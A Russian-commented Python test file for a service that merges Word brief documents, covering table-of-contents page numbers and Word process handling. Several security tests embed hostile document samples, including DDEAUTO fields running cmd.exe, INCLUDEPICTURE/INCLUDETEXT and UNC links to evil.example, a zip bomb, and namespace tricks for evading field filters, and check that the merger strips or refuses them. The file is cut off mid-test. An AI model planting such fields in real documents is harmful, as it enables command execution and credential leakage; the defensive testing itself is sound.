"""
Номера страниц в оглавлении и объединение прикреплённых файлов брифов (задача 21.09).

Word здесь подменяется: сборщик сразу пишет прикидку, а в фоне — числа, что назвал Word.
Просьбу «обновить поля при открытии» не пишет никогда. Настоящий Word зовёт только
последний тест, и только при BRIEF_PAGES=word (Mac со стендом): номера в оглавлении
сверяются со страницами PDF, который сохранил сам Word.
"""
import io, json, os, re, shutil, subprocess, sys, tempfile, unittest, uuid, zipfile
from xml.dom import minidom
from pathlib import Path

ROOT_DIR = Path(__file__).resolve().parents[1]
APP = ROOT_DIR / "app"
sys.path.insert(0, str(APP))
import build_brief as bb      # noqa: E402
import build_joint as bj      # noqa: E402
import build_summary as bs    # noqa: E402
import pages                  # noqa: E402

DL = Path.home() / "Downloads"
EX = ROOT_DIR / "legacy-console" / "примеры"
REGIONS = {
    "алтай": DL / "СВОД_СПРАВКА_по_системе_образования_Республики_Алтай (1).docx",
    "свердловская": DL / "СВОД_СПРАВКА_по_системе_образования_Свердловской_области (1).docx",
    "удмуртия": DL / "СВОД_СПРАВКА_по_системе_образования_Удмуртской_Рес_ (1).docx",
}
TMP = Path(tempfile.mkdtemp(prefix="brief_pages_"))


def brief_file(region):
    """Настоящий бриф для региона — тем же сборщиком, что и в сервисе."""
    out = TMP / f"{region}.docx"
    if not out.exists():
        F = bb.coerce(json.loads((EX / f"{region}_факты.json").read_text(encoding="utf8")))
        bb.build(bb.docx_text(REGIONS[region]), F, out)
    return out


def part(path, name):
    with zipfile.ZipFile(path) as z:
        return z.read(name).decode("utf8")


def plain(xml):
    paras = ["".join(re.findall(r"<w:t(?: [^>]*)?>(.*?)</w:t>", p)) for p in re.findall(r"<w:p[ >].*?</w:p>", xml, re.S)]
    return re.sub(r"\s+", " ", " ".join(paras)).replace("\xa0", " ").strip()


def toc_numbers(xml, prefix="_Q"):
    """Числа, записанные результатом полей PAGEREF в оглавлении."""
    return [int(n) for n in re.findall(
        rf'PAGEREF {prefix}\d+ \\h </w:instrText></w:r><w:r>.*?<w:fldChar w:fldCharType="separate"/></w:r>'
        r'<w:r><w:rPr>.*?</w:rPr><w:t>(\d+)</w:t>', xml)]


class FakeWord:
    """Подмена Word: включён настройкой и называет заданные страницы закладок (None — молчит)."""
    def __init__(self, answer, delay=0.0):
        self.answer, self.calls, self.delay = answer, [], delay

    def ask(self, path, names):
        import time
        self.calls.append((str(path), Path(path).read_bytes(), list(names)))
        time.sleep(self.delay)
        return dict(self.answer) if self.answer else None

    def __enter__(self):
        self.orig, self.env = pages.word_pages, os.environ.get("BRIEF_PAGES")
        os.environ["BRIEF_PAGES"] = "word"
        pages.word_pages = self.ask
        return self

    def __exit__(self, *a):
        pages.settle()
        pages.word_pages = self.orig
        if self.env is None:
            os.environ.pop("BRIEF_PAGES", None)
        else:
            os.environ["BRIEF_PAGES"] = self.env


def rewrite_docx(src, dst, edit):
    """Копия .docx с правкой частей: edit(dict имя → байты)."""
    with zipfile.ZipFile(src) as z:
        files = {i.filename: z.read(i) for i in z.infolist()}
    edit(files)
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in files.items():
            z.writestr(n, d)
    return dst


class TestPageNumbers(unittest.TestCase):
    def test_01_chisla_word_zapisany_v_oglavlenie(self):
        """Номера страниц — готовые числа от Word, а не «1» у всех; пересчёт при открытии не нужен."""
        files = [(f"{r}.docx", brief_file(r).read_bytes()) for r in ("удмуртия", "алтай", "свердловская")]
        with FakeWord({"_Q1": 2, "_Q2": 5, "_Q3": 9, "*": 12}) as w:
            res = bj.merge_files(files, TMP / "m1.docx", title="К совещанию")
            pages.settle()
        xml = part(TMP / "m1.docx", "word/document.xml")
        self.assertEqual(toc_numbers(xml), [2, 5, 9])
        self.assertEqual(res["pages"][0], 2)                      # ответ сразу — прикидкой
        self.assertNotIn("updateFields", part(TMP / "m1.docx", "word/settings.xml"))
        # Word получил копию, а не документ сервиса (зависший Word не держит файл, К2)
        self.assertEqual(w.calls[0][2], ["_Q1", "_Q2", "_Q3"])
        self.assertNotEqual(Path(w.calls[0][0]).resolve(), (TMP / "m1.docx").resolve())

    def test_02_bez_word_prikidka_bez_pereschyota(self):
        """Word не ответил — числа прикинуты по объёму, по порядку и не «1». Просьбы обновить поля
        при открытии нет: Word предлагал бы её каждому, кто откроет документ (RC-18, К1)."""
        files = [(f"{r}.docx", brief_file(r).read_bytes()) for r in ("удмуртия", "алтай")]
        with FakeWord(None):
            res = bj.merge_files(files, TMP / "m2.docx")
        nums = toc_numbers(part(TMP / "m2.docx", "word/document.xml"))
        self.assertEqual(nums, res["pages"])
        self.assertEqual(nums[0], 2)
        self.assertGreater(nums[1], nums[0])
        self.assertNotIn("updateFields", part(TMP / "m2.docx", "word/settings.xml"))

    def test_03_svodnyy_iz_reestra_tozhe(self):
        """Сводный из реестра (build_joint) берёт числа Word тем же путём."""
        qs = [{"kind": "region", "facts": bb.coerce(json.loads((EX / f"{r}_факты.json").read_text(encoding="utf8"))),
               "text": bb.docx_text(REGIONS[r]), "title": f"Вопрос {r}"} for r in ("алтай", "удмуртия")]
        with FakeWord({"_Q1": 2, "_Q2": 6}):
            bj.build_joint(qs, TMP / "j.docx", title="Сводный")
        self.assertEqual(toc_numbers(part(TMP / "j.docx", "word/document.xml")), [2, 6])

    def test_04_sammari_s_nomerami(self):
        """В оглавлении саммари теперь есть номера страниц — поля PAGEREF на доклады."""
        src = [{"name": "Иванов.docx", "text": "Принято 34 512 первоклассников в 2026 году, на 1 208 больше.\n"},
               {"name": "Петрова.docx", "text": "Открыто 214 вакансий учителей математики и физики в 2026 году.\n"}]
        F = {"title": "Саммари докладов", "event": "Совещание", "talks": [
            {"speaker": "Иванов А.И.", "topic": "Приём", "key_points": [{"text": "Принято 34 512 первоклассников",
                                                                         "q": "Принято 34 512 первоклассников"}]},
            {"speaker": "Петрова Б.В.", "topic": "Кадры", "key_points": [{"text": "Открыто 214 вакансий",
                                                                          "q": "Открыто 214 вакансий"}]}]}
        with FakeWord({"_Talk1": 2, "_Talk2": 3}):
            bs.build_summary(src, F, TMP / "s.docx")
        xml = part(TMP / "s.docx", "word/document.xml")
        self.assertEqual(toc_numbers(xml, "_Talk"), [2, 3])
        self.assertIn("Саммари доклада Иванова А.И.", plain(xml))


class TestMerge(unittest.TestCase):
    def test_01_poryadok_nomer_i_tekst_kak_v_faylakh(self):
        order = ("алтай", "свердловская", "удмуртия")
        files = [(f"{r}.docx", brief_file(r).read_bytes()) for r in order]
        with FakeWord(None):
            res = bj.merge_files(files, TMP / "m3.docx", title="Бриф к совещанию 25.09")
        out = TMP / "m3.docx"
        xml = part(out, "word/document.xml")
        for name in ("word/document.xml", "word/numbering.xml", "word/styles.xml", "word/_rels/document.xml.rels"):
            minidom.parseString(part(out, name).encode("utf8"))          # Word откроет: XML цел
        self.assertEqual([q["title"] for q in res["questions"]],
                         ["О системе общего образования Республики Алтай",
                          "О системе общего образования Свердловской области",
                          "О системе общего образования Удмуртской Республики"])
        # номер вопроса — в первой строке второго столбца, по порядку, прежний «1.» снят
        tables = re.findall(r"<w:tbl>.*?</w:tbl>", xml, re.S)
        firsts = [plain(re.findall(r"<w:tc>.*?</w:tc>", t, re.S)[1]) for t in tables]
        self.assertEqual(firsts, [f"{i}. {q['title']}" for i, q in enumerate(res["questions"], 1)])
        # каждый бриф — с новой страницы, текст брифа тот же, что в файле
        self.assertEqual(xml.count('<w:br w:type="page"/>'), 3)
        text = plain(xml)
        for n, r in enumerate(order, 1):
            alone = plain(part(brief_file(r), "word/document.xml"))
            self.assertIn(alone.replace("Вопрос 1. ", f"Вопрос {n}. ", 1), text)
        # содержание с полями на каждый вопрос, «К оглавлению» ведёт к содержанию сводного
        self.assertEqual(xml.count("PAGEREF _Q"), 3)
        marks = re.findall(r'<w:bookmarkStart\b[^>]*w:name="([^"]*)"', xml)
        self.assertEqual(marks.count("_Toc1"), 1)
        for a in set(re.findall(r'w:anchor="([^"]*)"', xml)):
            self.assertIn(a, marks)
        ids = re.findall(r'<w:bookmarkStart\b[^>]*w:id="(\d+)"', xml)
        self.assertEqual(len(ids), len(set(ids)))
        # списки брифов указывают на существующие определения
        numbering = part(out, "word/numbering.xml")
        have = set(re.findall(r'<w:num\b[^>]*w:numId="(\d+)"', numbering))
        self.assertTrue(set(re.findall(r'<w:numId w:val="(\d+)"', xml)) - {"0"} <= have)

    def test_02_chuzhoy_fayl_ponyatnoe_soobshchenie(self):
        good = brief_file("алтай").read_bytes()
        cases = {
            "справка.docx": (REGIONS["алтай"].read_bytes(), "не похож на бриф"),
            "картинка.docx": (b"\x89PNG\r\n\x1a\n" + b"0" * 100, "не документ Word"),
            "старый.docx": (b"\xd0\xcf\x11\xe0" + b"0" * 100, "старый формат Word"),
        }
        for name, (data, why) in cases.items():
            with self.subTest(name=name):
                with self.assertRaises(bj.MergeError) as e:
                    bj.merge_files([("алтай.docx", good), (name, data)], TMP / "bad.docx")
                self.assertIn(why, str(e.exception))
                self.assertIn(name, str(e.exception))

    def test_03_kartinka_ssylka_i_spisok_iz_worda(self):
        """Бриф, поправленный в Word: картинка, внешняя ссылка и свой список переносятся с ним."""
        src = brief_file("удмуртия")
        png = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4"
               b"\x89\x00\x00\x00\rIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82")

        def edit(f):
            doc = f["word/document.xml"].decode()
            pic = ('<w:p><w:r><w:drawing><wp:inline><wp:extent cx="9525" cy="9525"/><wp:docPr id="1" name="p"/>'
                   '<a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
                   '<a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">'
                   '<pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:nvPicPr>'
                   '<pic:cNvPr id="1" name="p"/><pic:cNvPicPr/></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId900"/>'
                   '</pic:blipFill><pic:spPr/></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>'
                   '<w:p><w:hyperlink r:id="rId901"><w:r><w:t>сайт</w:t></w:r></w:hyperlink></w:p>'
                   '<w:p><w:pPr><w:numPr><w:ilvl w:val="0"/><w:numId w:val="3"/></w:numPr></w:pPr>'
                   '<w:r><w:t>пункт списка</w:t></w:r></w:p>')
            f["word/document.xml"] = doc.replace("<w:sectPr", pic + "<w:sectPr", 1).encode()
            rels = f["word/_rels/document.xml.rels"].decode()
            f["word/_rels/document.xml.rels"] = rels.replace("</Relationships>",
                '<Relationship Id="rId900" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/>'
                '<Relationship Id="rId901" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org/" TargetMode="External"/>'
                "</Relationships>").encode()
            f["word/media/image1.png"] = png

        edited = rewrite_docx(src, TMP / "правленый.docx", edit)
        with FakeWord(None):
            bj.merge_files([("алтай.docx", brief_file("алтай").read_bytes()),
                            ("правленый.docx", edited.read_bytes())], TMP / "m4.docx")
        out = TMP / "m4.docx"
        xml = part(out, "word/document.xml")
        rels = part(out, "word/_rels/document.xml.rels")
        embed = re.search(r'r:embed="([^"]+)"', xml).group(1)
        link = re.search(r'<w:hyperlink r:id="([^"]+)"', xml).group(1)
        self.assertRegex(rels, rf'Id="{embed}"[^>]*Target="media/m2_image1.png"')
        self.assertRegex(rels, rf'Id="{link}"[^>]*Target="https://example.org/" TargetMode="External"')
        with zipfile.ZipFile(out) as z:
            self.assertEqual(z.read("word/media/m2_image1.png"), png)
            self.assertIn('Extension="png"', z.read("[Content_Types].xml").decode())
        # список брифа получил свой номер в сводном, и он определён
        new_num = re.search(r'<w:numId w:val="(\d+)"/></w:numPr></w:pPr><w:r><w:t>пункт списка', xml).group(1)
        self.assertRegex(part(out, "word/numbering.xml"), rf'<w:num w:numId="{new_num}"')

    def test_03b_ssylki_tolko_v_veb_i_pochtu(self):
        """Гиперссылки file://, \\\\сервер и относительные снимаются (текст остаётся);
        http, https и mailto переносятся (RC-2026-09-22-2)."""
        links = {"rId910": "file:///C:/secret.docx", "rId911": "\\\\evil.example\\share\\x.docx",
                 "rId912": "x.docx", "rId913": "https://example.org/", "rId914": "mailto:a@example.org",
                 "rId915": "HTTP://example.org/2", "rId916": "https://example.org/?a=1&amp;b=2&amp;q=%22x%22"}

        def edit(f):
            doc = f["word/document.xml"].decode()
            paras = "".join(f'<w:p><w:hyperlink r:id="{rid}"><w:r><w:t>текст {rid}</w:t></w:r></w:hyperlink></w:p>'
                            for rid in links)
            f["word/document.xml"] = doc.replace("<w:sectPr", paras + "<w:sectPr", 1).encode()
            rels = "".join(f'<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
                           f'relationships/hyperlink" Target="{t}" TargetMode="External"/>' for rid, t in links.items())
            f["word/_rels/document.xml.rels"] = f["word/_rels/document.xml.rels"].decode().replace(
                "</Relationships>", rels + "</Relationships>").encode()

        edited = rewrite_docx(brief_file("удмуртия"), TMP / "ссылки.docx", edit)
        with FakeWord(None):
            bj.merge_files([("алтай.docx", brief_file("алтай").read_bytes()),
                            ("ссылки.docx", edited.read_bytes())], TMP / "m6.docx")
        xml = part(TMP / "m6.docx", "word/document.xml")
        rels = part(TMP / "m6.docx", "word/_rels/document.xml.rels")
        text = plain(xml)
        for rid in links:
            self.assertIn(f"текст {rid}", text)
        for bad in ("file:", "evil.example", 'Target="x.docx"', "DROPLINK"):
            self.assertNotIn(bad, rels + xml)
        for good in ("https://example.org/", "mailto:a@example.org", "HTTP://example.org/2"):
            self.assertIn(f'Target="{good}"', rels)
        # «&» в адресе экранируется ровно один раз: после разбора XML адрес тот же, что был (RC-22-3)
        self.assertNotIn("&amp;amp;", rels)
        targets = [el.getAttribute("Target") for el in minidom.parseString(rels.encode("utf8")).getElementsByTagName("Relationship")]
        self.assertIn("https://example.org/?a=1&b=2&q=%22x%22", targets)
        self.assertEqual(xml.count("<w:hyperlink r:id="), 4)
        for rid in ("rId910", "rId911", "rId912"):          # снятые — обычным текстом, не внутри ссылки
            self.assertNotRegex(xml, rf"<w:hyperlink\b[^>]*>(?:(?!</w:hyperlink>).)*текст {rid}")

    def test_04_obekt_i_snoski_otkaz(self):
        src = brief_file("удмуртия")

        def ole(f):
            doc = f["word/document.xml"].decode()
            f["word/document.xml"] = doc.replace("<w:sectPr", '<w:p><w:r><w:object><o:OLEObject r:id="rId950"/>'
                                                 '</w:object></w:r></w:p><w:sectPr', 1).encode()
            f["word/_rels/document.xml.rels"] = f["word/_rels/document.xml.rels"].decode().replace(
                "</Relationships>", '<Relationship Id="rId950" Type="http://schemas.openxmlformats.org/'
                'officeDocument/2006/relationships/oleObject" Target="embeddings/x.bin"/></Relationships>').encode()

        def note(f):
            doc = f["word/document.xml"].decode()
            f["word/document.xml"] = doc.replace("<w:sectPr", '<w:p><w:r><w:footnoteReference w:id="2"/></w:r></w:p>'
                                                 "<w:sectPr", 1).encode()

        for fn, why in ((ole, "встроенный объект"), (note, "сноски")):
            with self.subTest(why=why):
                bad = rewrite_docx(src, TMP / "с_объектом.docx", fn)
                with self.assertRaises(bj.MergeError) as e, FakeWord(None):
                    bj.merge_files([("алтай.docx", brief_file("алтай").read_bytes()),
                                    ("с_объектом.docx", bad.read_bytes())], TMP / "m5.docx")
                self.assertIn(why, str(e.exception))


def fld(instr, result):
    return (f'<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> {instr} </w:instrText></w:r>'
            f'<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>{result}</w:t></w:r>'
            '<w:r><w:fldChar w:fldCharType="end"/></w:r>')


def with_body(name, extra):
    """Бриф «удмуртия» с добавленными в конец абзацами."""
    return rewrite_docx(brief_file("удмуртия"), TMP / name, lambda f: f.update({
        "word/document.xml": f["word/document.xml"].decode().replace("<w:sectPr", extra + "<w:sectPr", 1).encode()}))


class TestReviewRC18(unittest.TestCase):
    """Замечания ревьюера RC-2026-09-21-18 к объединению файлов и вызову Word."""

    def merge(self, name, data):
        with FakeWord(None):
            return bj.merge_files([("алтай.docx", brief_file("алтай").read_bytes()), (name, data)], TMP / "r.docx")

    def test_k1_opasnye_polya_snyaty(self):
        """INCLUDEPICTURE по UNC, DDEAUTO, INCLUDETEXT по http — ни кода, ни поля; видимый текст остаётся.
        Внутренние PAGEREF и HYPERLINK \\l остаются."""
        evil = ("<w:p>" + fld('INCLUDEPICTURE "\\\\evil.example\\share\\x.png" \\d', "картинка")
                + fld('DDEAUTO c:\\windows\\system32\\cmd.exe "/c calc"', "расчёт")
                + fld('INCLUDETEXT "http://evil.example/x"', "вставка")
                + '<w:fldSimple w:instr=" INCLUDEPICTURE &quot;\\\\evil.example\\y&quot; "><w:r><w:t>простое</w:t></w:r></w:fldSimple>'
                + fld('HYPERLINK "\\\\evil.example\\z"', "ссылка")
                + fld("PAGEREF _Toc1 \\h", "1") + fld('HYPERLINK \\l "_Toc1"', "к оглавлению") + "</w:p>")
        self.merge("ловушка.docx", with_body("ловушка.docx", evil).read_bytes())
        xml = part(TMP / "r.docx", "word/document.xml")
        low = xml.lower()
        for bad in ("includepicture", "ddeauto", "includetext", "evil.example", "cmd.exe"):
            self.assertNotIn(bad, low)
        text = plain(xml)
        for seen in ("картинка", "расчёт", "вставка", "простое", "ссылка", "к оглавлению"):
            self.assertIn(seen, text)
        self.assertIn('HYPERLINK \\l "_Toc1"', xml)
        self.assertEqual(xml.count('fldCharType="begin"'), xml.count('fldCharType="end"'))
        for f in re.findall(r'<w:instrText[^>]*>([^<]*)', xml):
            self.assertTrue(bj.field_ok(f), f)
        self.assertNotIn("updateFields", part(TMP / "r.docx", "word/settings.xml"))

    def test_k1_vlozhennoe_pole_i_kod_bez_polya(self):
        nested = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>INCLUDETEXT "</w:instrText></w:r>'
                  + fld("REF адрес", "\\\\evil.example\\q")
                  + '<w:r><w:instrText>"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>'
                  '<w:r><w:t>снаружи</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>'
                  '<w:r><w:instrText>DDEAUTO cmd</w:instrText></w:r></w:p>')
        self.merge("вложенное.docx", with_body("вложенное.docx", nested).read_bytes())
        xml = part(TMP / "r.docx", "word/document.xml")
        self.assertNotIn("evil.example", xml)
        self.assertNotIn("INCLUDETEXT", xml)
        self.assertNotIn("DDEAUTO", xml)
        self.assertIn("снаружи", plain(xml))

    def test_k2_word_po_umolchaniyu_vyklyuchen(self):
        env = os.environ.pop("BRIEF_PAGES", None)
        try:
            self.assertEqual(pages.mode(), "off")          # и на Windows: включает только настройка
            called = []
            orig = pages._windows, pages._mac
            pages._windows = pages._mac = lambda *a: called.append(a) or {}
            try:
                self.assertIsNone(pages.word_pages(brief_file("алтай"), ["_Q1"]))
            finally:
                pages._windows, pages._mac = orig
            self.assertEqual(called, [])
        finally:
            if env is not None:
                os.environ["BRIEF_PAGES"] = env

    def test_k2_otkaz_word_pauza(self):
        """Word не ответил в срок — следующие сборки его не ждут (пауза после отказа)."""
        env = os.environ.get("BRIEF_PAGES")
        os.environ["BRIEF_PAGES"] = "word"
        calls = []

        def hang(*a):
            calls.append(a)
            raise subprocess.TimeoutExpired("powershell", pages.timeout())
        orig = pages._windows, pages._mac, pages._STATE["down_until"]
        pages._windows = pages._mac = hang
        try:
            self.assertIsNone(pages.word_pages(brief_file("алтай"), ["_Q1"]))
            self.assertIsNone(pages.word_pages(brief_file("алтай"), ["_Q1"]))
            self.assertEqual(len(calls), 1)
            self.assertLessEqual(pages.timeout(), 20)
        finally:
            pages._windows, pages._mac, pages._STATE["down_until"] = orig
            os.environ.pop("BRIEF_PAGES") if env is None else os.environ.__setitem__("BRIEF_PAGES", env)

    def winword_timeout(self, listings):
        """Запуск Word с подменённым списком процессов, по сроку; возвращает (вызовы taskkill, что видел Popen)."""
        seen, runs, it = {}, [], iter(listings)

        class Proc:
            pid = 4242

            def __init__(self, args, **kw):
                seen["args"] = args

            def communicate(self, timeout=None):
                seen["timeout"] = timeout
                raise subprocess.TimeoutExpired("powershell", timeout)

        class Out:
            def __init__(self, text):
                self.stdout = text.encode()

        def run(args, **kw):
            runs.append(args)
            if "-Command" in args:
                text = next(it)
                if text is None:
                    raise OSError("powershell недоступен")
                return Out(text)
            return Out("")

        orig = subprocess.Popen, subprocess.run
        subprocess.Popen, subprocess.run = Proc, run
        try:
            with self.assertRaises(subprocess.TimeoutExpired):
                pages._windows(brief_file("алтай"), ["_Q1"])
        finally:
            subprocess.Popen, subprocess.run = orig
        return [r for r in runs if r[0] == "taskkill"], seen

    def test_k2_ubivaet_svoy_winword(self):
        """По сроку завершается powershell и только свой WINWORD: которого не было до запуска, из того же
        сеанса и поднятый через COM («-Embedding») — так снимается и зависший на самом запуске; Word
        человека и Word из другого сеанса остаются. Word открывает копию во временной папке."""
        W = "C:\\Office\\WINWORD.EXE"
        kills, seen = self.winword_timeout([
            f"SESSION|1\n100|1|{W} /n\n",                                     # до запуска: Word человека
            f"SESSION|1\n100|1|{W} /n\n200|1|{W} /Automation -Embedding\n"     # после: наш 200,
            f"300|1|{W} /n\n400|2|{W} /Automation -Embedding\n",               # чужой 300 и чужой сеанс 400
        ])
        self.assertEqual(kills, [["taskkill", "/F", "/T", "/PID", "4242"], ["taskkill", "/F", "/PID", "200"]])
        self.assertLessEqual(seen["timeout"], 20)
        opened = Path(seen["args"][seen["args"].index("-Path") + 1])
        self.assertNotEqual(opened.resolve(), brief_file("алтай").resolve())
        self.assertIn("$w.Documents.Count -eq 0", pages._PS)           # чужой открытый Word не закрываем
        self.assertIn("-match '-Embedding'", pages._PS)                # и после удачи снимаем только свой
        self.assertIn("$_.SessionId -eq $session", pages._PS)

    def test_k2_bez_snimka_do_nichego_ne_snimaem(self):
        """Снимок «до» не удался — по сроку снимается только powershell, ни один WINWORD (RC-22-3)."""
        W = "C:\\Office\\WINWORD.EXE"
        after = f"SESSION|1\n200|1|{W} /Automation -Embedding\n"
        for before in (None, ""):                                    # ошибка запуска и пустой ответ
            with self.subTest(before=before):
                kills, _ = self.winword_timeout([before, after])
                self.assertEqual(kills, [["taskkill", "/F", "/T", "/PID", "4242"]])

    def test_k2_pamyat_o_putyakh_ogranichena(self):
        """_GEN/_ALIAS не растут без предела за время жизни процесса (RC-22-3)."""
        with pages._FILES:
            saved = dict(pages._GEN), dict(pages._ALIAS)
        try:
            for i in range(pages.REMEMBER + 300):
                with pages._FILES:
                    pages._GEN[f"/x/{i}"] = 1
                    pages._ALIAS[f"/y/{i}"] = Path("/z")
                    pages._trim()
            self.assertLessEqual(len(pages._GEN), pages.REMEMBER)
            self.assertLessEqual(len(pages._ALIAS), pages.REMEMBER)
            self.assertIn(f"/x/{pages.REMEMBER + 299}", pages._GEN)        # забываются старые, не свежие
            self.assertNotIn("/x/0", pages._GEN)
        finally:
            with pages._FILES:
                pages._GEN.clear(); pages._GEN.update(saved[0])
                pages._ALIAS.clear(); pages._ALIAS.update(saved[1])

    def test_k2_dokument_perelozhili_poka_word_schital(self):
        """Саммари собирается в стороне и кладётся на место (finish_build): числа от Word приходят
        уже по новому адресу; отменённый или откаченный документ уточнение не трогает."""
        files = [(f"{r}.docx", brief_file(r).read_bytes()) for r in ("удмуртия", "алтай")]
        stage = TMP / ".сборка"
        stage.mkdir(exist_ok=True)
        with FakeWord({"_Q1": 7, "_Q2": 9}, delay=1.0):
            bj.merge_files(files, stage / "s.docx")
            pages.moved(stage / "s.docx", TMP / "final.docx")
            pages.settle()
        self.assertFalse((stage / "s.docx").exists())
        self.assertEqual(toc_numbers(part(TMP / "final.docx", "word/document.xml")), [7, 9])
        with FakeWord({"_Q1": 7, "_Q2": 9}, delay=1.0):
            bj.merge_files(files, stage / "s.docx")
            pages.forget(stage / "s.docx")
            before = (stage / "s.docx").read_bytes()
            pages.settle()
        self.assertEqual((stage / "s.docx").read_bytes(), before)

    def test_k2_sborka_ne_zhdyot_word_i_ne_zatiraet_novoe(self):
        """Сборка отвечает, не дожидаясь Word; если документ пересобрали, пока Word считал,
        его старые числа новый файл не затирают."""
        import time
        files = [(f"{r}.docx", brief_file(r).read_bytes()) for r in ("удмуртия", "алтай")]
        with FakeWord({"_Q1": 7, "_Q2": 9}, delay=1.5):
            t0 = time.time()
            bj.merge_files(files, TMP / "g.docx", title="Первая")
            self.assertLess(time.time() - t0, 1.0)
            bj.merge_files(files[::-1], TMP / "g.docx", title="Вторая")    # пересобрали, пока Word думает
            pages.settle()
        xml = part(TMP / "g.docx", "word/document.xml")
        self.assertIn("Вторая", plain(xml))
        self.assertEqual(toc_numbers(xml), [7, 9])        # числа второй сборки, заголовок — тоже её

    def test_n1_bomba_v_stilyakh(self):
        """styles.xml на 40 МБ нулей (в архиве — десятки КБ) — отказ сразу, память не раздувается."""
        bomb = rewrite_docx(brief_file("удмуртия"), TMP / "бомба.docx",
                            lambda f: f.update({"word/styles.xml": b"<" + b"0" * (40 * 1024 * 1024)}))
        self.assertLess(bomb.stat().st_size, 1024 * 1024)
        with self.assertRaises(bj.MergeError) as e:
            self.merge("бомба.docx", bomb.read_bytes())
        self.assertIn("слишком большой", str(e.exception))

    def test_n2_bityy_arkhiv(self):
        """Порча сжатых данных, шифрование, чужой способ сжатия — MergeError с понятной причиной, не 500."""
        good = brief_file("удмуртия").read_bytes()

        def patch_entry(data, name, fn):
            z = zipfile.ZipFile(io.BytesIO(data))
            info = z.getinfo(name)
            b = bytearray(data)
            fn(b, info)
            return bytes(b)

        def corrupt(b, info):
            start = info.header_offset + 30 + len(info.filename.encode()) + len(info.extra)
            for i in range(start + 10, start + 40):
                b[i] ^= 0xFF

        def encrypt(b, info):
            b[info.header_offset + 6] |= 1
            pos = 0
            while True:
                pos = bytes(b).find(b"PK\x01\x02", pos)
                if pos < 0:
                    break
                n = int.from_bytes(b[pos + 28:pos + 30], "little")
                if bytes(b[pos + 46:pos + 46 + n]) == info.filename.encode():
                    b[pos + 8] |= 1
                pos += 4

        def method(b, info):
            pos = 0
            b[info.header_offset + 8:info.header_offset + 10] = (99).to_bytes(2, "little")
            while True:
                pos = bytes(b).find(b"PK\x01\x02", pos)
                if pos < 0:
                    break
                n = int.from_bytes(b[pos + 28:pos + 30], "little")
                if bytes(b[pos + 46:pos + 46 + n]) == info.filename.encode():
                    b[pos + 10:pos + 12] = (99).to_bytes(2, "little")
                pos += 4

        for why, fn in (("порча", corrupt), ("шифр", encrypt), ("сжатие", method)):
            for entry in ("word/document.xml", "word/styles.xml"):
                with self.subTest(why=why, entry=entry):
                    with self.assertRaises(bj.MergeError) as e:
                        self.merge("битый.docx", patch_entry(good, entry, fn))
                    self.assertIn("битый.docx", str(e.exception))

    def test_n3_nerazbiraemyy_xml(self):
        """Неизвестная сущность или оборванный тег — отказ с причиной, а не сводный, который не откроется."""
        for extra in ("<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>", "<w:p><w:r><w:t>обрыв</w:r></w:p>"):
            with self.subTest(extra=extra):
                with self.assertRaises(bj.MergeError) as e:
                    self.merge("кривой.docx", with_body("кривой.docx", extra).read_bytes())
                self.assertIn("повреждён", str(e.exception))


W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"


class TestReviewRC22(unittest.TestCase):
    """RC-2026-09-22-1, К1: фильтр полей не обойти, объявив пространство Word под другой приставкой."""

    def merge(self, name, data):
        with FakeWord(None):
            return bj.merge_files([("алтай.docx", brief_file("алтай").read_bytes()), (name, data)], TMP / "ns.docx")

    def refused(self, name, data):
        with self.assertRaises(bj.MergeError) as e:
            self.merge(name, data)
        self.assertIn(name, str(e.exception))
        return str(e.exception)

    def test_01_drugaya_pristavka(self):
        evil = (f'<w:p xmlns:q="{W}"><q:r><q:fldChar q:fldCharType="begin"/></q:r>'
                '<q:r><q:instrText> INCLUDEPICTURE "\\\\evil.example\\x.png" </q:instrText></q:r>'
                '<q:r><q:fldChar q:fldCharType="separate"/></q:r><q:r><q:t>картинка</q:t></q:r>'
                '<q:r><q:fldChar q:fldCharType="end"/></q:r>'
                '<q:fldSimple q:instr=" INCLUDETEXT &quot;http://evil.example/&quot; "><q:r><q:t>т</q:t></q:r></q:fldSimple></w:p>')
        self.assertIn("сохраните", self.refused("приставка.docx", with_body("приставка.docx", evil).read_bytes()))

    def test_02_prostranstvo_po_umolchaniyu(self):
        evil = (f'<p xmlns="{W}"><r><fldChar fldCharType="begin"/></r>'
                '<r><instrText> DDEAUTO cmd.exe "/c calc" </instrText></r><r><fldChar fldCharType="end"/></r></p>')
        self.refused("по_умолчанию.docx", with_body("по_умолчанию.docx", evil).read_bytes())

    def test_03_strict_i_ssylki_na_simvoly(self):
        """Strict (purl.oclc.org) и адрес, записанный ссылками на символы, — тоже отказ."""
        strict = rewrite_docx(brief_file("удмуртия"), TMP / "strict.docx", lambda f: f.update({
            "word/document.xml": f["word/document.xml"].decode().replace(
                f'xmlns:w="{W}"', 'xmlns:w="http://purl.oclc.org/ooxml/wordprocessingml/main"', 1).encode()}))
        self.refused("strict.docx", strict.read_bytes())
        coded = W.replace("main", "&#109;ain")
        evil = (f'<w:p xmlns:q="{coded}"><q:r><q:fldChar q:fldCharType="begin"/></q:r>'
                '<q:r><q:instrText> INCLUDETEXT "http://evil.example/" </q:instrText></q:r>'
